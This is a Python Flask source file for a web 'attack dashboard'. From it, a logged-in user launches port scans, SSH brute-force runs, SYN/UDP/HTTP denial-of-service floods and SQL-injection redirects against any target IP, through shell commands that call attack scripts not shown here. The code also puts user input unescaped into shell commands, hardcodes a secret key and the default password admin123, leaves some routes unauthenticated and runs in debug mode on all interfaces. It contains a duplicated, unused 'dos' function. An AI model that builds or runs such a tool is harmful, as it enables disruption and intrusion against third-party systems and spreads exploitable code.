from flask import Flask, render_template, request, jsonify, redirect, url_for, session
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime
import subprocess
import threading
import os
from werkzeug.security import generate_password_hash, check_password_hash

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key-change-this'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///attack_dashboard.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# Database Models
class Attack(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    attack_type = db.Column(db.String(100), nullable=False)
    target_ip = db.Column(db.String(50), nullable=False)
    target_port = db.Column(db.String(20))
    status = db.Column(db.String(20), default='pending')
    output = db.Column(db.Text)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    duration = db.Column(db.Float)

class ScanResult(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    target_ip = db.Column(db.String(50), nullable=False)
    scan_type = db.Column(db.String(50))
    open_ports = db.Column(db.Text)
    services = db.Column(db.Text)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(200), nullable=False)

# Initialize database
with app.app_context():
    db.create_all()
    # Create default admin user
    if not User.query.filter_by(username='admin').first():
        admin = User(username='admin', password_hash=generate_password_hash('admin123'))
        db.session.add(admin)
        db.session.commit()

# Routes
@app.route('/')
def index():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    return render_template('index.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        data = request.get_json()
        user = User.query.filter_by(username=data['username']).first()
        if user and check_password_hash(user.password_hash, data['password']):
            session['user_id'] = user.id
            return jsonify({'success': True})
        return jsonify({'success': False, 'message': 'Invalid credentials'})
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    return redirect(url_for('login'))

@app.route('/dashboard')
def dashboard():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    recent_attacks = Attack.query.order_by(Attack.timestamp.desc()).limit(10).all()
    recent_scans = ScanResult.query.order_by(ScanResult.timestamp.desc()).limit(5).all()
    return render_template('dashboard.html', attacks=recent_attacks, scans=recent_scans)

@app.route('/scan', methods=['GET', 'POST'])
def scan():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        data = request.get_json()
        target_ip = data.get('target_ip')
        scan_type = data.get('scan_type', 'basic')
        
        thread = threading.Thread(target=run_nmap_scan, args=(target_ip, scan_type))
        thread.start()
        
        return jsonify({'success': True, 'message': 'Scan started'})
    return render_template('scan.html')

@app.route('/brute-force', methods=['GET', 'POST'])
def brute_force():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        data = request.get_json()
        target_ip = data.get('target_ip')
        service = data.get('service', 'ssh')
        username = data.get('username', 'root')
        
        thread = threading.Thread(target=run_brute_force, args=(target_ip, service, username))
        thread.start()
        
        return jsonify({'success': True, 'message': 'Brute force attack started'})
    return render_template('brute_force.html')

@app.route('/dos', methods=['GET', 'POST'])
def dos():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        data = request.get_json()
        target_ip = data.get('target_ip')
        target_port = data.get('target_port', '80')
        attack_type = data.get('attack_type', 'syn_flood')
        
        thread = threading.Thread(target=run_dos_attack, args=(target_ip, target_port, attack_type))
        thread.start()
        
        return jsonify({'success': True, 'message': 'DoS attack started'})
    return render_template('dos.html')

@app.route('/sql-injection')
def sql_injection():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    return render_template('sql_injection.html')

@app.route('/redirect-sql', methods=['POST'])
def redirect_sql():
    data = request.get_json()
    target_url = data.get('target_url')
    payload = data.get('payload')
    
    # Store payload in session for injection
    session['sql_payload'] = payload
    
    # Construct URL with SQL injection payload
    if '?' in target_url:
        injected_url = f"{target_url}&{payload}"
    else:
        injected_url = f"{target_url}?{payload}"
    
    return jsonify({'success': True, 'redirect_url': injected_url})

@app.route('/api/attacks')
def get_attacks():
    attacks = Attack.query.order_by(Attack.timestamp.desc()).limit(20).all()
    return jsonify([{
        'id': a.id,
        'type': a.attack_type,
        'target': a.target_ip,
        'status': a.status,
        'timestamp': a.timestamp.isoformat()
    } for a in attacks])

@app.route('/api/scans')
def get_scans():
    scans = ScanResult.query.order_by(ScanResult.timestamp.desc()).limit(10).all()
    return jsonify([{
        'id': s.id,
        'target': s.target_ip,
        'open_ports': s.open_ports,
        'timestamp': s.timestamp.isoformat()
    } for s in scans])

# Attack execution functions
def run_nmap_scan(target_ip, scan_type):
    attack = Attack(attack_type=f'nmap_{scan_type}', target_ip=target_ip, status='running')
    db.session.add(attack)
    db.session.commit()
    
    try:
        if scan_type == 'aggressive':
            cmd = f"python3 attacks/nmap_scan.py {target_ip} aggressive"
        else:
            cmd = f"python3 attacks/nmap_scan.py {target_ip} basic"
        
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=300)
        
        scan_result = ScanResult(
            target_ip=target_ip,
            scan_type=scan_type,
            open_ports=result.stdout,
            services=result.stdout
        )
        db.session.add(scan_result)
        
        attack.status = 'completed'
        attack.output = result.stdout
        db.session.commit()
    except Exception as e:
        attack.status = 'failed'
        attack.output = str(e)
        db.session.commit()

def run_brute_force(target_ip, service, username):
    attack = Attack(attack_type=f'brute_force_{service}', target_ip=target_ip, status='running')
    db.session.add(attack)
    db.session.commit()
    
    try:
        cmd = f"python3 attacks/brute_force.py {target_ip} {service} {username}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600)
        
        attack.status = 'completed'
        attack.output = result.stdout
        db.session.commit()
    except Exception as e:
        attack.status = 'failed'
        attack.output = str(e)
        db.session.commit()

def dos():
    if 'user_id' not in session:
        return redirect(url_for('login'))
    if request.method == 'POST':
        data = request.get_json()
        target_ip = data.get('target_ip')
        target_port = data.get('target_port', '80')
        attack_type = data.get('attack_type', 'syn_flood')
        duration = data.get('duration', 60)
        
        # Validate nuclear/ultimate attacks require confirmation
        if attack_type in ['nuclear', 'ultimate']:
            # These attacks will prompt for confirmation in the Python script
            pass
        
        thread = threading.Thread(
            target=run_dos_attack, 
            args=(target_ip, target_port, attack_type, duration)
        )
        thread.start()
        
        return jsonify({
            'success': True, 
            'message': f'{attack_type} attack started',
            'duration': duration
        })
    return render_template('dos.html')

def run_dos_attack(target_ip, target_port, attack_type, duration=60):
    """Enhanced DoS attack execution with duration support"""
    attack = Attack(
        attack_type=f'dos_{attack_type}', 
        target_ip=target_ip, 
        target_port=target_port, 
        status='running'
    )
    db.session.add(attack)
    db.session.commit()
    
    try:
        # Build command based on attack type
        if attack_type in ['nuclear', 'ultimate']:
            # For nuclear attacks, only pass IP and duration (port not needed)
            cmd = f"python3 attacks/dos_attack.py {target_ip} {attack_type} {duration}"
        elif attack_type in ['ultra_syn', 'raw_syn', 'mega_udp', 'nuclear_http', 'enhanced_slow']:
            # Enhanced attacks with duration
            cmd = f"python3 attacks/dos_attack.py {target_ip} {target_port} {attack_type} {duration}"
        else:
            # Legacy attacks
            cmd = f"python3 attacks/dos_attack.py {target_ip} {target_port} {attack_type} {duration}"
        
        print(f"[*] Executing: {cmd}")
        
        # Execute with timeout slightly longer than duration
        timeout = int(duration) + 30
        result = subprocess.run(
            cmd, 
            shell=True, 
            capture_output=True, 
            text=True, 
            timeout=timeout
        )
        
        attack.status = 'completed'
        attack.output = result.stdout if result.stdout else result.stderr
        attack.duration = duration
        db.session.commit()
        
        print(f"[+] Attack completed: {attack_type} on {target_ip}:{target_port}")
        
    except subprocess.TimeoutExpired:
        attack.status = 'timeout'
        attack.output = f"Attack timed out after {timeout} seconds"
        db.session.commit()
        print(f"[!] Attack timeout: {attack_type}")
        
    except Exception as e:
        attack.status = 'failed'
        attack.output = str(e)
        db.session.commit()
        print(f"[!] Attack failed: {e}")

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)